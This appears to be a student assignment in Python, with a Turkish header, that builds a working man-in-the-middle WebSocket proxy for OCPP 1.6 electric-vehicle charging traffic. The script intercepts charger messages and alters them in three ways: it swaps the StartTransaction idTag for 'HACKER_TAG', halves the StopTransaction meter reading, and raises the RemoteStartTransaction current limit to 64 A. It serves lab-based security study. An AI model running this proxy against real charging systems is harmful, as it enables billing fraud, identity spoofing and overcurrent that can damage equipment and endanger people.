#!/usr/bin/env python3
"""
MitM Saldırı Simülasyonu (Ödev)
Büşra Gül - 180541037

NOT: Bu dosya bir WebSocket proxy örneğidir. Güvenli lab ortamı dışında kullanmayın.
"""

import asyncio
import json
import os
from datetime import datetime

import websockets

LOG_FILE = "logs/mitm_logs.txt"


def log(message: str) -> None:
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    log_entry = f"[{timestamp}] {message}\n"
    print(log_entry.strip())
    os.makedirs(os.path.dirname(LOG_FILE), exist_ok=True)
    with open(LOG_FILE, "a", encoding="utf-8") as f:
        f.write(log_entry)


def manipulate_message(message: str) -> str:
    """Mesajı parse edip (varsa) ödevde tanımlı 3 manipülasyonu uygular.

    OCPP CALL formatı: [2, uniqueId, action, payload]
    Alan isimleri hem snake_case hem camelCase olabilir.
    """
    try:
        data = json.loads(message)

        if not (isinstance(data, list) and len(data) >= 4 and data[0] == 2):
            return message

        action = data[2]
        payload = data[3] if isinstance(data[3], dict) else {}

        log(f"[MitM] Intercepted: {action}")

        # --- StartTransaction: id_tag / idTag ---
        if action == "StartTransaction":
            tag_key = "id_tag" if "id_tag" in payload else ("idTag" if "idTag" in payload else None)
            if tag_key:
                original = payload.get(tag_key)
                payload[tag_key] = "HACKER_TAG"
                log(f"[MitM] Changed id_tag: {original} -> HACKER_TAG")

        # --- StopTransaction: meter_stop / meterStop ---
        if action == "StopTransaction":
            mkey = "meter_stop" if "meter_stop" in payload else ("meterStop" if "meterStop" in payload else None)
            if mkey:
                original = int(payload[mkey])
                payload[mkey] = int(original * 0.5)
                log(f"[MitM] Changed meter_stop: {original} -> {payload[mkey]}")

        # --- RemoteStartTransaction: charging_profile/chargingProfile + max_current/maxCurrent ---
        if action == "RemoteStartTransaction":
            profile_key = (
                "charging_profile" if "charging_profile" in payload
                else ("chargingProfile" if "chargingProfile" in payload else None)
            )
            if profile_key and isinstance(payload.get(profile_key), dict):
                prof = payload[profile_key]
                max_key = "max_current" if "max_current" in prof else ("maxCurrent" if "maxCurrent" in prof else None)
                if max_key:
                    original = prof.get(max_key, 32)
                    prof[max_key] = 64
                    log(f"[MitM] Changed max_current: {original} -> 64 A")

        return json.dumps(data)

    except Exception as e:
        log(f"[MitM] Error manipulating message: {e}")
        return message


async def proxy(client_ws, server_uri: str) -> None:
    try:
        async with websockets.connect(server_uri, subprotocols=["ocpp1.6"]) as server_ws:
            log("[MitM] Proxy active: Client <-> Proxy <-> Server")

            async def forward_to_server():
                async for message in client_ws:
                    log("[MitM] >>> Client -> Server")
                    manipulated = manipulate_message(message)
                    await server_ws.send(manipulated)

            async def forward_to_client():
                async for message in server_ws:
                    log("[MitM] <<< Server -> Client")
                    await client_ws.send(message)

            await asyncio.gather(forward_to_server(), forward_to_client())

    except Exception as e:
        log(f"[MitM] Error: {e}")


async def server(websocket, path: str) -> None:
    log("[MitM] New connection")
    server_uri = "ws://localhost:9000" + path
    await proxy(websocket, server_uri)


async def main() -> None:
    os.makedirs("logs", exist_ok=True)
    log("[MitM] Starting proxy on ws://localhost:8888")
    log("[MitM] Forwarding to ws://localhost:9000")

    srv = await websockets.serve(server, "0.0.0.0", 8888, subprotocols=["ocpp1.6"])
    log("[MitM] Proxy ready")
    await srv.wait_closed()


if __name__ == "__main__":
    asyncio.run(main())
